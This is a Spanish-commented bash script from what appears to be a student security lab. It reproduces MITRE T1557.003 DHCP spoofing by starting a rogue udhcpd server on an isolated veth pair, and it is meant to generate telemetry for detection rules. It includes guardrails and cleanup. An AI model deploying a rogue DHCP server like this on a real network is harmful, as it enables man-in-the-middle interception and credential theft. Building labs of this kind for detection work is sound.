#!/usr/bin/env bash
# ============================================================================
# ATA055 · T1557.003 DHCP Spoofing — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1557.003 Adversary-in-the-Middle: DHCP Spoofing
#           (tacticas Credential Access; Collection).
# Fuente  : custom (propio). ART no trae prueba de T1557 (tecnica ausente) -> propio.
# Objetivo: demostrar el mecanismo: un SERVIDOR DHCP SEÑUELO responde a un
#           CLIENTE EFIMERO y le entrega una concesion con GATEWAY/DNS
#           controlados por el atacante (base del MITM por DHCP spoofing).
# Topologia: segmento LOCAL AISLADO (par veth `vdhcp0`/`vdhcp1`) DENTRO de la
#           victima. El cliente escucha/emite SOLO por vdhcp1. NO se emite
#           ninguna trama en VMnet1/ens33: 0 riesgo para la red del laboratorio
#           (el DHCP de VMware sirve el mismo rango .128-.254 y competiria).
# Ejecuta : como ROOT (ip link + udhcpd), desde /home/angel/lab-attack/ATA055.
# Elevacion: SI (sudo; solo la ventana del ataque).
#
# ⚠️ GUARDARRAILES DUROS (abortan):
#   - el señuelo SOLO escucha en vdhcp0 (10.99.0.1/24), segmento aislado;
#   - PROHIBIDO ens33 / 192.168.65.0/24 / el manager;
#   - el cliente es un par veth efimero, jamas una interfaz real;
#   - al terminar: servidor parado, veth borrado, cliente sin proceso (0 residuos);
#   - NO queda ningun servidor DHCP activo.
#
# Telemetria esperada (ver README §5):
#   - execve de busybox (udhcpd y udhcpc) -> 80792 (deteccion; T1557.003-S1).
#   - execve de ip (setup)               -> 80792 (deteccion; T1557.003-S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA055/*` (S3).
#
# Prueba de exito (INDEPENDIENTE de la alerta): `lease.obtained` registra el
#   lease entregado por el señuelo (ip=10.99.0.x router=10.99.0.1 dns=10.99.0.1).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="/home/angel/lab-attack/ATA055"
VA="vdhcp0"
VB="vdhcp1"
SRV_IP="10.99.0.1"
SRV_CIDR="10.99.0.0/24"
MAX_TIME=15

echo "ATA055 · T1557.003 DHCP Spoofing (señuelo local + cliente efimero) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones -----------------------------------------------------------
[ -d "$BASE" ] || { echo "ERROR: no existe $BASE" >&2; exit 1; }
for b in busybox ip; do
  command -v "$b" >/dev/null 2>&1 || { echo "ERROR: falta $b" >&2; exit 1; }
done
busybox --list 2>/dev/null | grep -qx udhcpd || { echo "ERROR: busybox sin udhcpd" >&2; exit 1; }
busybox --list 2>/dev/null | grep -qx udhcpc || { echo "ERROR: busybox sin udhcpc" >&2; exit 1; }

# --- GUARDARRAILES ------------------------------------------------------------
case "$SRV_IP" in
  10.99.*) : ;;
  *) echo "ERROR: servidor señuelo '$SRV_IP' fuera del segmento aislado 10.99.0.0/24; ABORTADO" >&2; exit 1 ;;
esac
# el señuelo NO puede usar la red del laboratorio ni el manager
if [ "$SRV_IP" = "192.168.65.1" ] || [ "$SRV_IP" = "192.168.65.128" ]; then
  echo "ERROR: destino prohibido (PC/manager); ABORTADO" >&2; exit 1
fi
if [ "$MAX_TIME" -gt 15 ]; then echo "ERROR: tiempo fuera de cota" >&2; exit 1; fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }
: > "$BASE/lease.obtained"
rm -f "$BASE/udhcpd.leases" "$BASE/udhcpd.pid"

SRV_PID=""
cleanup() {
  if [ -n "$SRV_PID" ]; then kill "$SRV_PID" 2>/dev/null || true; fi
  pkill -f "busybox udhcpd" 2>/dev/null || true
  pkill -f "busybox udhcpc" 2>/dev/null || true
  ip link del "$VA" 2>/dev/null || true
}
trap cleanup EXIT

# --- segmento LOCAL AISLADO (par veth) ---------------------------------------
ip link del "$VA" 2>/dev/null || true
ip link add "$VA" type veth peer name "$VB"
ip addr add "$SRV_IP/24" dev "$VA"
ip link set "$VA" up
ip link set "$VB" up
echo "segmento_local: $VA=$SRV_IP/24  $VB=(cliente efimero, sin IP)"

# --- servidor DHCP SEÑUELO (solo vdhcp0) -------------------------------------
busybox udhcpd -f "$BASE/udhcpd.conf" > "$BASE/srv.out" 2>&1 &
SRV_PID=$!
sleep 1
if ! kill -0 "$SRV_PID" 2>/dev/null; then
  echo "ERROR: el señuelo udhcpd no arranco" >&2
  cat "$BASE/srv.out" >&2 || true
  exit 1
fi

# --- cliente efimero (solo vdhcp1) -------------------------------------------
echo "--- cliente efimero pidiendo lease al señuelo ---"
timeout "${MAX_TIME}s" busybox udhcpc -i "$VB" -f -n -q -t 5 -T 2 -s "$BASE/lease_script.sh" \
  > "$BASE/cli.out" 2>&1
cli_rc=$?
echo "cliente_rc=$cli_rc"
cat "$BASE/cli.out" 2>/dev/null || true

echo "--- lease entregado por el señuelo ---"
cat "$BASE/lease.obtained" 2>/dev/null || echo "(sin lease)"

# --- limpieza explicita -------------------------------------------------------
cleanup
trap - EXIT
sleep 1

echo "--- estado final ---"
echo "udhcpd_residual=$(pgrep -fc 'busybox udhcpd' 2>/dev/null || echo 0)"
echo "veth_residual=$(ip link show "$VA" 2>/dev/null | wc -l)"
if grep -q "router=10.99.0.1" "$BASE/lease.obtained" 2>/dev/null && [ "$(ip link show "$VA" 2>/dev/null | wc -l)" -eq 0 ]; then
  echo "DHCP_SPOOFING=OK (lease señuelo obtenido; 0 residuos de red/DHCP)"
else
  echo "DHCP_SPOOFING=FALLO (sin lease o con residuos)" >&2
fi
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
